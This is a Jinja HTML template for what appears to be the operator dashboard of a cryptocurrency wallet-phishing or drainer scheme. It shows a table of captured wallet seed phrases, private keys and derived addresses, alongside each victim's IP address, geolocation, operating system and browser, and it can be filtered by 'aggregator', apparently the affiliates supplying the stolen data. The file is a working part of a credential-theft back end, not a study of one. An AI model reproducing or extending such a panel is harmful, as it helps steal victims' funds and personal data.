{% extends 'base.html' %}
      
{% block title %} {{ title }} {% endblock %}
{% block content %}

<div class="">
    <div class="container">
        <p style="color: red;">{{ error }}</p>
        <form  method="POST" >
            <input type="text" name="agg_name" placeholder="Aggregator's ID">
            <input value="Submit" type="submit" class="btn btn-secondary">
        </form>
        <br>
    </div>

    <div class="table">
    <table>
        <tr>
            <th>Input time</th>
            <th>mnemonic</th>
            <th>EVM Private key</th>
            <th>EVM Address</th>
            <th>remark</th>
            <th>Aggregator</th>
            <th>Type</th>
            <th>Received Time</th>
            <th>IP address</th>
            <th>Geolocation</th>
            <th>OS</th>
            <th>Browser</th>

        </tr>
        {% for log in data%}
            <tr>
            {% if agg_name ==  log.aggregator_name or agg_name == '' %}
                <td>{{ format_date(log.date_created) }}</td>
                <td>{{ log.seed }}</td>
                <th>{{ log.key[:10] }}...</th>
                <td><a href="https://blockscan.com/address/{{  pubAddr(log.key)  }}" target="_blank">{{  pubAddr(log.key)[:10]  }}...</a></td>
                <td style="color: {{ format_error_color(log.remark) }} ">{{ format_error_string(log.remark) }}</td>
                <td>{{ log.aggregator_name }}</td>
                <td>{{ log.intype }}</td>
                <td>{{ log.received_date }}</td>
                <td>{{ log.ip }}</td>
                <td>{{ log.geo }}</td>
                <td>{{ log.os }}</td>
                <td>{{ log.browser }}</td>
            {% endif %}
            </tr>
        {% endfor %}
    </table>
    </div>
</div>

{% endblock %}
